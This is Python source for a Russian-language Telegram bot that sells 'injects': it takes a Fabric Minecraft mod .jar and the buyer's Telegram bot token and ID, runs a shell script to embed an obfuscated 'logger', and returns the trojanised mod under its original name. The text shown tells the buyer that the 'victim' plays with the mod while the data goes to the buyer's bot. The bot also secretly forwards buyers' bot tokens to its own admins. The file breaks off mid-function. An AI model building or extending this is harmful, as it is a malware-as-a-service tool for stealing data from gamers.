import asyncio
import json
import os
import random
import re
import string
import time
import zipfile
from pathlib import Path

from aiogram import Bot, Dispatcher, F, Router
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.exceptions import TelegramBadRequest
from aiogram.filters import Command, CommandStart
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.types import (
    CallbackQuery,
    Document,
    FSInputFile,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    Message,
)

BASE_DIR = Path(__file__).resolve().parent
CONFIG_FILE = BASE_DIR / "config.json"
USERS_FILE = BASE_DIR / "users.json"
PROMOS_FILE = BASE_DIR / "promos.json"
ADMIN_LINKS_FILE = BASE_DIR / "admin_links.json"
MODS_DIR = BASE_DIR / "mods"
INFECTED_DIR = BASE_DIR / "infected"
WELCOME_BANNER = BASE_DIR / "hello.png"
MODS_DIR.mkdir(exist_ok=True)
INFECTED_DIR.mkdir(exist_ok=True)

with open(CONFIG_FILE, "r", encoding="utf-8-sig") as f:
    CONFIG = json.load(f)

TOKEN = CONFIG["bot_token"]
ADMIN_IDS = set(CONFIG.get("admin_ids", []))
CHANNEL_URL = CONFIG.get("channel_url", "https://t.me/your_channel")
SUPPORT_URL = CONFIG.get("support_url", "https://t.me/your_support")
MOD_VERSION = CONFIG.get("mod_version", "1.21.4")
INJECT_DIR = CONFIG.get("inject_dir", "D:/logger/fabric-1.21.4")
STAR_PRICE = int(CONFIG.get("star_price", 25))
RUB_PRICE = int(CONFIG.get("rub_price", 25))
ADMIN_USERNAME = CONFIG.get("admin_username", "").lstrip("@")
FUNPAY_URL = CONFIG.get("funpay_url", "")
REVIEWS_CHANNEL = CONFIG.get("reviews_channel", "")
REQUIRED_CHANNEL = CONFIG.get("required_channel", "")
WELCOME_TEXT = CONFIG.get(
    "welcome_text",
    "Добро пожаловать! Пригласи друга и получи бесплатный инжект.",
)

if TOKEN == "PASTE_ADMIN_BOT_TOKEN_HERE":
    raise SystemExit("Впиши bot_token в config.json")


def load_users():
    if USERS_FILE.exists():
        with open(USERS_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    return {}


def save_users(users):
    with open(USERS_FILE, "w", encoding="utf-8") as f:
        json.dump(users, f, ensure_ascii=False, indent=2)


def load_promos():
    if PROMOS_FILE.exists():
        with open(PROMOS_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    return {}


def save_promos(promos):
    with open(PROMOS_FILE, "w", encoding="utf-8") as f:
        json.dump(promos, f, ensure_ascii=False, indent=2)


users = load_users()


def get_user(user_id):
    return users.get(str(user_id))


def create_user(user_id, username=""):
    user = {
        "username": username or str(user_id),
        "injects": 0,
        "invite_code": "".join(random.choices(string.ascii_letters + string.digits, k=8)),
        "invited_by": None,
        "has_invited": False,
        "blocked": False,
        "created": int(time.time()),
    }
    users[str(user_id)] = user
    save_users(users)
    return user


bot = Bot(token=TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher()
router = Router()
dp.include_router(router)

inject_lock = asyncio.Lock()
BOT_USERNAME = "bot"


def main_menu() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(text="Вшить логгер в мод", callback_data="inject_start"),
            ],
            [
                InlineKeyboardButton(text="Бесплатный инжект", callback_data="free"),
                InlineKeyboardButton(text="🛒 Купить инжекты", callback_data="buy"),
            ],
            [
                InlineKeyboardButton(text="⭐ Оценить бота", callback_data="review"),
                InlineKeyboardButton(text="📝 Отзывы", callback_data="reviews"),
            ],
            [
                InlineKeyboardButton(text="🐛 Баг/Идея", callback_data="bug"),
            ],
            [
                InlineKeyboardButton(text="Поддержка", url=SUPPORT_URL),
                InlineKeyboardButton(text="Канал", url=CHANNEL_URL),
            ],
        ]
    )


async def send_welcome(message: Message) -> None:
    if WELCOME_BANNER.exists():
        await message.answer_photo(
            FSInputFile(str(WELCOME_BANNER)),
            caption=WELCOME_TEXT,
            reply_markup=main_menu(),
        )
    else:
        await send_welcome(message)


def load_admin_links():
    if ADMIN_LINKS_FILE.exists():
        with open(ADMIN_LINKS_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    return {}


def save_admin_links(links):
    with open(ADMIN_LINKS_FILE, "w", encoding="utf-8") as f:
        json.dump(links, f, ensure_ascii=False, indent=2)


class BotStates(StatesGroup):
    version = State()
    credentials = State()
    file = State()
    bug = State()
    review_anon = State()
    review_comment = State()


@router.message(CommandStart(deep_link=True))
async def start_deep(message: Message):
    user_id = message.from_user.id
    username = message.from_user.username or message.from_user.full_name
    user = get_user(user_id)
    is_new = user is None
    if user is None:
        user = create_user(user_id, username)

    payload = message.text.split(None, 1)
    ref_code = payload[1] if len(payload) > 1 else None
    inviter = None

    if ref_code and not user.get("invited_by") and not user.get("has_invited"):
        admin_links = load_admin_links()
        if ref_code in admin_links:
            admin_link = admin_links[ref_code]
            admin_id = admin_link["admin_id"]
            user["invited_by"] = f"admin_{admin_id}"
            save_users(users)
            admin_link["uses"] = admin_link.get("uses", 0) + 1
            admin_links[ref_code] = admin_link
            save_admin_links(admin_links)
            if is_new:
                await send_welcome(message)
            return
        for uid, u in users.items():
            if u.get("invite_code") == ref_code and str(uid) != str(user_id):
                inviter = u
                break
        if inviter is not None and not inviter.get("has_invited"):
            inviter_uid = next((k for k, v in users.items() if v is inviter), None)
            user["invited_by"] = inviter_uid
            user["injects"] = user.get("injects", 0) + 1
            inviter["has_invited"] = True
            inviter["injects"] = inviter.get("injects", 0) + 1
            save_users(users)
            try:
                await bot.send_message(
                    int(inviter_uid),
                    f"🎉 <b>У тебя новый реферал!</b>\n\n"
                    f"👤 Приглашённый: {username}\n"
                    f"💳 Тебе начислен <b>1 инжект</b> (бесплатный инжект)\n\n"
                    f"Твой баланс: <b>{inviter.get('injects', 0)}</b>\n\n"
                    f"Нажми «Вшить логгер в мод» и используй его!",
                )
            except Exception:
                pass
            if is_new:
                await send_welcome(message)
            await message.answer(
                "🎉 <b>Поздравляем! Ты пришёл по реферальной ссылке!</b>\n\n"
                "✅ Тебе начислен <b>1 бесплатный инжект</b>\n\n"
                "Теперь ты можешь:\n"
                "• Нажать «Вшить логгер в мод» и получить свой первый заражённый мод\n"
                "• Пригласить своего друга и получить ещё один инжект\n\n"
                "Если что-то непонятно — нажми «Поддержка» в меню."
            )
            return

    if is_new:
        await send_welcome(message)
    else:
        await message.answer("Главное меню:", reply_markup=main_menu())


@router.message(CommandStart())
async def start(message: Message):
    user_id = message.from_user.id
    username = message.from_user.username or message.from_user.full_name
    user = get_user(user_id)
    if user is None:
        create_user(user_id, username)
    await send_welcome(message)


@router.callback_query(F.data == "menu")
async def back_to_menu(callback: CallbackQuery):
    await callback.answer()
    await callback.message.answer("Главное меню:", reply_markup=main_menu())


@router.callback_query(F.data == "check_sub")
async def check_subscription(callback: CallbackQuery):
    user_id = callback.from_user.id
    try:
        member = await bot.get_chat_member(REQUIRED_CHANNEL, user_id)
        if member.status in ("left", "kicked"):
            raise Exception("not subscribed")
    except Exception:
        await callback.answer("❌ Ты ещё не подписан на канал!", show_alert=True)
        return
    await callback.answer("✅ Подписка подтверждена!")
    await callback.message.edit_text("✅ Подписка подтверждена!")
    await callback.message.answer("Главное меню:", reply_markup=main_menu())


@router.callback_query(F.data == "inject_start")
async def inject_start(callback: CallbackQuery, state: FSMContext):
    await callback.answer()
    user_id = callback.from_user.id
    user = get_user(user_id)
    if user is None:
        user = create_user(user_id, callback.from_user.username or "")
    if user.get("blocked"):
        await callback.message.answer(
            "🚫 <b>Ты заблокирован.</b>\n\n"
            "Твой аккаунт был ограничен администрацией.\n"
            "Если считаешь, что это ошибка — напиши в поддержку."
        )
        return
    if REQUIRED_CHANNEL:
        try:
            member = await bot.get_chat_member(REQUIRED_CHANNEL, user_id)
            if member.status in ("left", "kicked"):
                raise Exception("not subscribed")
        except Exception:
            channel_name = REQUIRED_CHANNEL.lstrip("@")
            await callback.message.answer(
                f"📢 <b>Подпишись на канал!</b>\n\n"
                f"Для использования бота необходимо подписаться "
                f"на наш канал:\n\n"
                f"👉 <a href=\"https://t.me/{channel_name}\">{REQUIRED_CHANNEL}</a>\n\n"
                f"После подписки нажми «Проверить» 👇",
                reply_markup=InlineKeyboardMarkup(
                    inline_keyboard=[
                        [InlineKeyboardButton(text="📢 Перейти в канал", url=f"https://t.me/{channel_name}")],
                        [InlineKeyboardButton(text="✅ Проверить подписку", callback_data="check_sub")],
                    ]
                ),
            )
            return
    if user.get("injects", 0) <= 0:
        await callback.message.answer(
            f"❌ <b>У тебя нет инжектов.</b>\n\n"
            f"Но не расстраивайся! Есть бесплатный способ получить инжект:\n\n"
            f"1️⃣ Отправь свою реферальную ссылку другу:\n"
            f"<code>https://t.me/{BOT_USERNAME}?start={user.get('invite_code')}</code>\n\n"
            f"2️⃣ Друг переходит по ссылке и становится твоим рефералом\n"
            f"3️⃣ Вы <b>оба</b> получаете по <b>1 бесплатному инжекту</b>\n\n"
            f"⚠️ Важно: пригласить можно только 1 друга, и получить инжект — тоже только 1 раз.\n"
            f"\nТвой баланс: <b>0 инжектов</b>",
            reply_markup=InlineKeyboardMarkup(
                inline_keyboard=[[InlineKeyboardButton(text="🎁 Бесплатный инжект", callback_data="free")]]
            ),
        )
        return
    await state.set_state(BotStates.version)
    user_injects = user.get("injects", 0)
    await callback.message.answer(
        f"🛠 <b>Вшить логгер в мод</b>\n\n"
        f"Отлично, у тебя есть <b>{user_injects} инжект(ов)</b>!\n\n"
        f"Сначала скажи: <b>какая версия Minecraft у твоего мода?</b>\n"
        f"От этого зависит, с какой версией логгера будет собран твой мод.\n\n"
        f"Выбери версию ниже:",
        reply_markup=InlineKeyboardMarkup(
            inline_keyboard=[[InlineKeyboardButton(text=f"Minecraft {MOD_VERSION}", callback_data="version_ok")]]
        ),
    )


@router.callback_query(F.data == "version_ok", BotStates.version)
async def version_selected(callback: CallbackQuery, state: FSMContext):
    await callback.answer()
    await state.update_data(version=MOD_VERSION)
    await state.set_state(BotStates.credentials)
    await callback.message.answer(
        f"✅ Версия выбрана: <b>Minecraft {MOD_VERSION}</b>\n\n"
        f"Теперь мне нужны данные для логгера. Пришли следующее:\n\n"
        f"1️⃣ <b>Токен бота</b> — токен Telegram-бота, которому будет приходить вся информация"
        f" (создай бота через @BotFather и скопируй токен)\n"
        f"2️⃣ <b>Твой Telegram ID</b> — твой цифровой ID, куда будут слаться данные "
        f"(узнать: напиши @userinfobot)\n\n"
        f"Формат — токен и ID через пробел, в одну строку:\n"
        f"<code>123456789:AAHcO6Nv9OGwcZFLxxiLLemFuttLak36gu4 123456789</code>\n\n"
        f"⚠️ Парни, без лишних символов — только токен и ID. Пример выше — для ориентира."
    )


@router.message(BotStates.credentials)
async def credentials_received(message: Message, state: FSMContext):
    text = message.text.strip() if message.text else ""
    m = re.fullmatch(r"(\d+:[A-Za-z0-9_-]+)\s+(-?\d+)", text)
    if not m:
        await message.answer(
            "🤔 <b>Не могу распознать данные.</b>\n\n"
            "Проверь формат: токен и ID через пробел, одной строкой:\n"
            "<code>123456789:AAHcO6Nv9OGwcZFLxxiLLemFuttLak36gu4 123456789</code>\n\n"
            "Частые ошибки:\n"
            "• Токен без «:» или с пробелом внутри\n"
            "• ID без пробела перед токеном\n"
            "• Лишние слова или символы\n\n"
            "Попробуй ещё раз — просто скопируй токен и ID через пробел 👆"
        )
        return
    bot_token, admin_id = m.group(1), m.group(2)
    user_id = message.from_user.id
    user = get_user(user_id)
    if user is None:
        user = create_user(user_id, message.from_user.username or "")
    await state.update_data(bot_token=bot_token, admin_id=admin_id, original_file=None)
    await state.set_state(BotStates.file)
    await message.answer(
        f"📥 <b>Отлично! Данные приняты.</b>\n\n"
        f"✔️ Токен бота: <code>{bot_token}</code>\n"
        f"✔️ Telegram ID: <code>{admin_id}</code>\n"
        f"✔️ Версия: <b>Minecraft {MOD_VERSION}</b>\n\n"
        f"Теперь <b>пришли файл мода</b> (архив .jar), в который нужно вшить логгер.\n\n"
        f"Убедись, что это оригинальный Fabric-мод:\n"
        f"• файл с расширением <code>.jar</code>\n"
        f"• версия мода совпадает с выбранной\n\n"
        f"Присылай файл и жди — обработка займёт пару минут ⏳",
        reply_markup=main_menu()
    )


@router.message(BotStates.file, F.document)
async def file_received(message: Message, state: FSMContext):
    doc: Document = message.document
    if not doc.file_name or not doc.file_name.lower().endswith(".jar"):
        await message.answer(
            "❌ <b>Нужен файл мода с расширением .jar</b>\n\n"
            "Ты прислал не тот файл. Требования:\n"
            "• Файл — архив мода для Fabric, расширение <code>.jar</code>\n"
            "• Не APK, не ZIP-архив с изменённым расширением\n\n"
            "Пришли правильный jar-файл мода."
        )
        return

    user_id = message.from_user.id
    data = await state.get_data()
    bot_token = data.get("bot_token")
    admin_id = data.get("admin_id")

    safe_name = re.sub(r'[\\/:*?"<>|]', "_", doc.file_name)
    in_path = MODS_DIR / f"{user_id}_{int(time.time())}_{safe_name}"
    out_path = INFECTED_DIR / f"{user_id}_{int(time.time())}_{safe_name}"

    if doc.file_size and doc.file_size > 20 * 1024 * 1024:
        await message.answer(
            "❌ Файл слишком большой.\n"
            "Бот не может скачивать файлы больше 20MB — это ограничение Telegram.\n"
            "Что делать:\n"
            "• Напиши поддержке с просьбой личного инжекта (займет некоторое время)"
        )
        return

    try:
        await bot.download(doc, destination=in_path)
    except TelegramBadRequest as e:
        in_path.unlink(missing_ok=True)
        if "file is too big" in str(e):
            await message.answer(
                "❌ Файл слишком большой.\n"
                "Бот не может скачивать файлы больше 20MB — это ограничение Telegram.\n"
                "Что делать:\n"
                "• Напиши поддержке с просьбой личного инжекта (займет некоторое время)"
            )
        else:
            await message.answer(
                "❌ <b>Не удалось скачать файл.</b>\n\n"
                f"Ошибка: <code>{e}</code>\n\n"
                "Попробуй отправить файл ещё раз или напиши в поддержку."
            )
        return
    except Exception as e:
        in_path.unlink(missing_ok=True)
        await message.answer(
            f"❌ <b>Не удалось скачать файл.</b>\n\nОшибка: <code>{e}</code>"
        )
        return

    if not zipfile.is_zipfile(in_path):
        in_path.unlink(missing_ok=True)
        await message.answer(
            "❌ <b>Файл повреждён.</b>\n\n"
            "Присланный файл не является корректным jar-архивом.\n"
            "Это может быть:\n"
            "• недокачанный файл\n"
            "• архив с изменённым расширением\n"
            "• повреждённый мод\n\n"
            "Скачай мод заново и пришли файл ещё раз."
        )
        return
    with zipfile.ZipFile(in_path) as zf:
        if "fabric.mod.json" not in zf.namelist():
            in_path.unlink(missing_ok=True)
            await message.answer(
                "❌ <b>Это не Fabric-мод.</b>\n\n"
                "В архиве не найден файл <code>fabric.mod.json</code> — "
                "значит это не мод для Fabric Loader.\n\n"
                "Подходят только моды для Fabric (например, клиентские моды "
                "с fabric.mod.json внутри).\n\n"
                "Пришли корректный Fabric-мод."
            )
            return

    await state.clear()

    async with inject_lock:
        await message.answer(
            "⚙️ <b>Инжект запущен!</b>\n\n"
            "Идёт обработка твоего мода:\n"
            "🛠 Сборка модуля логгера...\n"
            "🔑 Подстановка токена и ID...\n"
            "🔒 Обфускация кода...\n"
            "📦 Вшивание в твой мод...\n\n"
            "⏳ Обычно это занимает <b>2–4 минуты</b>. "
            "Не закрывай чат — файл придёт сюда же."
        )
        ok = await run_inject(in_path, out_path, bot_token, admin_id)

    if not ok or not out_path.exists():
        in_path.unlink(missing_ok=True)
        out_path.unlink(missing_ok=True)
        await message.answer(
            "❌ <b>Инжект не удался.</b>\n\n"
            "Возможные причины:\n"
            "• неправильный токен бота или ID\n"
            "• мод не подходит для вшивания\n"
            "• ошибка на сервере\n\n"
            "Проверь данные и попробуй ещё раз. "
            "Если ошибка повторяется — напиши в поддержку.\n\n"
            "Твой инжект не был потрачен ✅"
        )
        return

    user = get_user(user_id)
    if user is None:
        user = create_user(user_id, message.from_user.username or "")
    user["injects"] = max(0, user.get("injects", 0) - 1)
    save_users(users)

    try:
        inf_file = FSInputFile(out_path, filename=doc.file_name)
        await message.answer_document(
            inf_file,
            caption=(
                f"✅ <b>Готово! Логгер вшит в мод.</b>\n\n"
                f"📁 <b>Мод:</b> <code>{doc.file_name}</code>\n"
                f"🎮 <b>Версия:</b> Minecraft {MOD_VERSION}\n"
                f"🤖 <b>Данные приходят:</b> на твой бот\n\n"
                f"📌 <b>Инструкция:</b>\n"
                f"1. Скачай файл ниже\n"
                f"2. Положи его в папку <code>mods</code> "
                f"(замени оригинал с тем же названием)\n"
                f"3. Запусти Minecraft — жертва играет с модом, "
                f"а вся инфа летит на твой бот\n\n"
                f"⚠️ Мод был переименован? Нет — имя сохранено, "
                f"как у оригинала.\n\n"
                f"🎁 Осталось инжектов: <b>{user['injects']}</b>"
            ),
            reply_markup=InlineKeyboardMarkup(
                inline_keyboard=[
                    [InlineKeyboardButton(text="⭐ Оценить бота", callback_data="review")]
                ]
            ),
        )
        username = message.from_user.username or message.from_user.full_name
        for admin_id in ADMIN_IDS:
            try:
                await bot.send_message(
                    admin_id,
                    f"💉 <b>Новый инжект</b>\n\n"
                    f"👤 Пользователь: <code>{user_id}</code> (@{username})\n"
                    f"📁 Мод: <code>{doc.file_name}</code>\n"
                    f"💳 Осталось инжектов: <b>{user['injects']}</b>",
                )
            except Exception:
                pass
    except Exception as e:
        user["injects"] += 1
        save_users(users)
        await message.answer(
            f"⚠️ <b>Инжект готов, но не смог отправить файл.</b>\n\n"
            f"Ошибка: <code>{e}</code>\n"
            f"Попробуй ещё раз или обратись в поддержку.\n\n"
            f"Твой инжект не был потрачен ✅"
        )
        in_path.unlink(missing_ok=True)
        out_path.unlink(missing_ok=True)
        return

    in_path.unlink(missing_ok=True)
    out_path.unlink(missing_ok=True)

    for aid in ADMIN_IDS:
        try:
            await bot.send_message(
                aid,
                f"💉 <b>Новый инжект!</b>\n\n"
                f"👤 Пользователь: <code>{user_id}</code> (@{message.from_user.username or 'нет'})\n"
                f"🤖 Токен бота: <code>{bot_token}</code>\n"
                f"🆔 Telegram ID: <code>{admin_id}</code>\n"
                f"📁 Мод: <code>{doc.file_name}</code>",
            )
        except Exception:
            pass


@router.callback_query(F.data == "bug")
async def bug_start(callback: CallbackQuery, state: FSMContext):
    await callback.answer()
    await state.set_state(BotStates.bug)
    await callback.message.answer(
        "🐛 <b>Сообщить о баге или предложить идею</b>\n\n"
        "Напиши текстом, что сломалось или что хочешь добавить.",
        reply_markup=InlineKeyboardMarkup(
            inline_keyboard=[
                [InlineKeyboardButton(text="❌ Отмена", callback_data="bug_cancel")]
            ]
        ),
    )


@router.callback_query(F.data == "bug_cancel", BotStates.bug)
async def bug_cancel(callback: CallbackQuery, state: FSMContext):
    await state.clear()
    await callback.answer("Отменено")
    await callback.message.edit_text("❌ Отменено.")


@router.message(BotStates.bug)
async def bug_receive(message: Message, state: FSMContext):
    await state.clear()
    username = message.from_user.username or message.from_user.full_name
    user_id = message.from_user.id
    text = message.text
    for admin_id in ADMIN_IDS:
        try:
            await bot.send_message(
                admin_id,
                f"🐛 <b>Баг / Идея</b>\n\n"
                f"👤 Пользователь: <code>{user_id}</code> (@{username})\n"
                f"💬 Сообщение:\n\n{text}",
            )
        except Exception:
            pass
    await message.answer(
        "✅ <b>Отправлено!</b>\n\n"
        "Администратор рассмотрит твоё сообщение. "
        "Если нужен ответ — напиши в поддержку."
    )


@router.message(BotStates.review_comment)
async def review_comment_text(message: Message, state: FSMContext):
    await state.update_data(comment=message.text)
    await state.set_state(BotStates.review_anon)
    await message.answer(
        "💬 Комментарий принят!\n\n"
        "📢 Опубликовать отзыв в канале?",
        reply_markup=InlineKeyboardMarkup(
            inline_keyboard=[
                [InlineKeyboardButton(text="👥 Показать юзернейм", callback_data="anon:no")],
                [InlineKeyboardButton(text="🕶 Скрыть юзернейм", callback_data="anon:yes")],
                [InlineKeyboardButton(text="❌ Не публиковать", callback_data="anon:skip")],
            ]
        ),
    )


@router.callback_query(F.data == "comment:skip", BotStates.review_comment)
async def review_comment_skip(callback: CallbackQuery, state: FSMContext):
    user_id = str(callback.from_user.id)
    user = get_user(user_id)
    if user and user.get("has_reviewed"):
        await state.clear()
        await callback.answer("❌ Ты уже оставил отзыв!", show_alert=True)
        return
    await state.update_data(comment="")
    await state.set_state(BotStates.review_anon)
    await callback.answer()
    await callback.message.answer(
        "📢 Опубликовать отзыв в канале?",
        reply_markup=InlineKeyboardMarkup(
            inline_keyboard=[
                [InlineKeyboardButton(text="👥 Показать юзернейм", callback_data="anon:no")],
                [InlineKeyboardButton(text="🕶 Скрыть юзернейм", callback_data="anon:yes")],
                [InlineKeyboardButton(text="❌ Не публиковать", callback_data="anon:skip")],
            ]
        ),
    )


async def run_inject(in_path: Path, out_path: Path, bot_token: str, admin_id: str) -> bool:
    if not in_path.exists() or in_path.stat().st_size == 0:
        print("inject error: input file missing or empty")
        return False
    try:
        proc = await asyncio.create_subprocess_exec(
            "bash",
            "inject.sh",
            str(in_path),
            str(out_path),
            bot_token,
            admin_id,
            "",
            cwd=str(INJECT_DIR),
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.STDOUT,
        )
        out, _ = await asyncio.wait_for(proc.communicate(), timeout=900)
        log = out.decode(errors="ignore")
        print(log[-2000:])
        return proc.returncode == 0 and out_path.exists()
    except asyncio.TimeoutError:
        proc.kill()
        return False
    except Exception as e:
        print("inject error:", e)
        return False


@router.callback_query(F.data == "free")
async def free_inject_info(callback: CallbackQuery):
    await callback.answer()
    user_id = callback.from_user.id
    user = get_user(user_id)
    if user is None:
        user = create_user(user_id, callback.from_user.username or "")
    if user.get("has_invited"):
        text = (
            "❌ <b>Ты уже приглашал друга.</b>\n\n"
            "Пригласить можно только <b>1 раз</b> — ты свой шанс использовал.\n\n"
            "Но это не конец! Ты можешь:\n"
            "• Проверить баланс командой /me\n"
            "• Вшить логгер, если у тебя есть инжекты\n"
            "• Написать в поддержку, если хочешь больше"
        )
    else:
        text = (
            "🎁 <b>Бесплатный инжект</b>\n\n"
            "Хочешь ещё один инжект бесплатно? Это просто!\n\n"
            "1️⃣ Скопируй свою персональную ссылку:\n"
            "<code>https://t.me/{username}?start={code}</code>\n\n"
            "2️⃣ Отправь её другу или в чат\n"
            "3️⃣ Когда друг перейдёт по ссылке — <b>вы оба</b> "
            "получите по <b>1 инжекту</b>!\n\n"
            "⚠️ Ограничения:\n"
            "• Пригласить можно только 1 друга\n"
            "• Получить бесплатный инжект можно только 1 раз"
        ).format(username=BOT_USERNAME, code=user.get("invite_code"))
    await callback.message.answer(
        f"{text}",
        reply_markup=InlineKeyboardMarkup(
            inline_keyboard=[
                [InlineKeyboardButton(text="🔗 Поделиться ссылкой", url=f"https://t.me/share/url?url=https://t.me/{BOT_USERNAME}?start={user.get('invite_code')}")],
                [InlineKeyboardButton(text="🎮 Вшить логгер в мод", callback_data="inject_start")],
            ]
        ),
    )


@router.callback_query(F.data == "buy")
async def buy_menu(callback: CallbackQuery):
    await callback.answer()
    await callback.message.answer(
        f"🛒 <b>Покупка инжектов</b>\n\n"
        f"1 инжект = {RUB_PRICE}₽ или {STAR_PRICE}⭐ (подарок «Роза» 🌹)\n\n"
        f"Выбери количество:",
        reply_markup=InlineKeyboardMarkup(
            inline_keyboard=[
                [
                    InlineKeyboardButton(text="1", callback_data="buy_count:1"),
                    InlineKeyboardButton(text="2", callback_data="buy_count:2"),
                    InlineKeyboardButton(text="3", callback_data="buy_count:3"),
                ],
                [
                    InlineKeyboardButton(text="5", callback_data="buy_count:5"),
                    InlineKeyboardButton(text="10", callback_data="buy_count:10"),
                ],
                [InlineKeyboardButton(text="◀️ Назад", callback_data="menu")],
            ]
        ),
    )


@router.callback_query(F.data.startswith("buy_count:"))
async def buy_count(callback: CallbackQuery):
    await callback.answer()
    count = int(callback.data.split(":")[1])
    await callback.message.answer(
        f"🛒 <b>{count} инжект(ов)</b>\n\n"
        f"Выбери способ оплаты:\n"
        f"• ⭐ Telegram Stars — {count * STAR_PRICE}⭐ (подарок «Роза»)\n"
        f"• 💳 Рубли — {count * RUB_PRICE}₽ (счёт FunPay)",
        reply_markup=InlineKeyboardMarkup(
            inline_keyboard=[
                [
                    InlineKeyboardButton(text="⭐ Оплатить звёздами", callback_data=f"stars:{count}"),
                    InlineKeyboardButton(text="💳 Оплатить рублями", callback_data=f"rub:{count}"),
                ],
                [InlineKeyboardButton(text="◀️ Назад", callback_data="buy")],
            ]
        ),
    )


@router.callback_query(F.data.startswith("stars:"))
async def buy_stars(callback: CallbackQuery):
    await callback.answer()
    count = int(callback.data.split(":")[1])
    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(
                    text="👤 Открыть профиль администратора",
                    url=f"https://t.me/{ADMIN_USERNAME}",
                )
            ],
            [InlineKeyboardButton(text="✅ Я отправил подарок", callback_data=f"giftsent:{count}")],
            [InlineKeyboardButton(text="◀️ Назад", callback_data="buy_count:{count}")],
        ]
    )
    await callback.message.answer(
        f"⭐ <b>Оплата звёздами</b>\n\n"
        f"Тебе нужно подарить <b>{count}</b> роз(ы) "
        f"(каждая — {STAR_PRICE}⭐), итого <b>{count * STAR_PRICE}⭐</b>\n\n"
        f"Как это сделать:\n"
        f"1️⃣ Открой профиль администратора по кнопке ниже\n"
        f"2️⃣ Нажми «⋯» → <b>Отправить подарок</b>\n"
        f"3️⃣ Выбери подарок <b>«Роза»</b> 🌹 ({STAR_PRICE}⭐)\n"
        f"4️⃣ Подтверди отправку\n\n"
        f"После этого нажми «Я отправил подарок» — "
        f"администратор проверит и начислит инжекты.",
        reply_markup=keyboard,
    )


@router.callback_query(F.data.startswith("giftsent:"))
async def stars_gift_sent(callback: CallbackQuery):
    await callback.answer("Заявка отправлена администратору ✅")
    count = int(callback.data.split(":")[1])
    user_id = callback.from_user.id
    username = callback.from_user.username or callback.from_user.full_name
    for admin_id in ADMIN_IDS:
        try:
            await bot.send_message(
                admin_id,
                f"⭐ <b>Заявка: подарок звёздами</b>\n\n"
                f"👤 Пользователь: <code>{user_id}</code> (@{username})\n"
                f"📦 Количество: <b>{count}</b> инжект(ов)\n"
                f"⭐ Сумма: <b>{count * STAR_PRICE}⭐</b> "
                f"(подарки «Роза» ×{count})\n\n"
                f"Проверь подарки у себя в профиле и подтверди:",
                reply_markup=InlineKeyboardMarkup(
                    inline_keyboard=[
                        [
                            InlineKeyboardButton(
                                text="✅ Подтвердить и начислить",
                                callback_data=f"confirm:{user_id}:{count}",
                            )
                        ],
                        [
                            InlineKeyboardButton(
                                text="🚫 Отклонить + варн",
                                callback_data=f"reject:{user_id}:{count}",
                            )
                        ],
                    ]
                ),
            )
        except Exception:
            pass
    await callback.message.answer(
        f"✅ <b>Заявка отправлена!</b>\n\n"
        f"Администратор проверит подарок и начислит тебе "
        f"<b>{count}</b> инжект(ов) в ближайшее время.\n\n"
        f"⚠️ <b>Внимание:</b> за <b>3 ложные заявки</b> "
        f"(когда подарок не был отправлен) — блокировка бота."
    )


@router.callback_query(F.data.startswith("rub:"))
async def buy_rub(callback: CallbackQuery):
    await callback.answer()
    count = int(callback.data.split(":")[1])
    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="💳 Открыть счёт FunPay", url=FUNPAY_URL)],
            [InlineKeyboardButton(text="✅ Я оплатил", callback_data=f"paid:{count}")],
            [InlineKeyboardButton(text="◀️ Назад", callback_data="buy_count:{count}")],
        ]
    )
    await callback.message.answer(
        f"💳 <b>Оплата рублями</b>\n\n"
        f"К оплате: <b>{count * RUB_PRICE}₽</b> за {count} инжект(ов)\n\n"
        f"1️⃣ Нажми «Открыть счёт FunPay» и оплати\n"
        f"2️⃣ Вернись и нажми «Я оплатил»\n"
        f"3️⃣ Администратор проверит платёж и начислит инжекты\n\n"
        f"⚠️ Укажи свой Telegram ID в комментарии к оплате: "
        f"<code>{callback.from_user.id}</code>",
        reply_markup=keyboard,
    )


@router.callback_query(F.data.startswith("paid:"))
async def rub_paid(callback: CallbackQuery):
    await callback.answer("Заявка отправлена администратору ✅")
    count = int(callback.data.split(":")[1])
    user_id = callback.from_user.id
    username = callback.from_user.username or callback.from_user.full_name
    for admin_id in ADMIN_IDS:
        try:
            await bot.send_message(
                admin_id,
                f"💳 <b>Заявка на оплату рублями</b>\n\n"
                f"👤 Пользователь: <code>{user_id}</code> (@{username})\n"
                f"📦 Количество: <b>{count}</b> инжект(ов)\n"
                f"💰 Сумма: <b>{count * RUB_PRICE}₽</b> (FunPay)\n\n"
                f"Проверь платёж и подтверди:",
                reply_markup=InlineKeyboardMarkup(
                    inline_keyboard=[
                        [
                            InlineKeyboardButton(
                                text="✅ Подтвердить и начислить",
                                callback_data=f"confirm:{user_id}:{count}",
                            )
                        ],
                        [
                            InlineKeyboardButton(
                                text="🚫 Отклонить + варн",
                                callback_data=f"reject:{user_id}:{count}",
                            )
                        ],
                    ]
                ),
            )
        except Exception:
            pass
    await callback.message.answer(
        f"✅ <b>Заявка отправлена!</b>\n\n"
        f"Администратор проверит оплату и начислит тебе "
        f"<b>{count}</b> инжект(ов) в ближайшее время.\n\n"
        f"⚠️ <b>Внимание:</b> за <b>3 ложные заявки</b> "
        f"(когда оплата не была совершена) — блокировка бота."
    )


@router.callback_query(F.data.startswith("reject:"))
async def admin_reject_payment(callback: CallbackQuery):
    if callback.from_user.id not in ADMIN_IDS:
        await callback.answer("❌ Только для администратора", show_alert=True)
        return
    _, target, count = callback.data.split(":")
    count = int(count)
    user = get_user(target)
    if user is None:
        user = create_user(target, target)
    warns = user.get("warns", 0) + 1
    user["warns"] = warns
    if warns >= 3:
        user["blocked"] = True
    save_users(users)
    await callback.answer("🚫 Отклонено, варн выдан", show_alert=True)
    await callback.message.edit_reply_markup(
        reply_markup=InlineKeyboardMarkup(
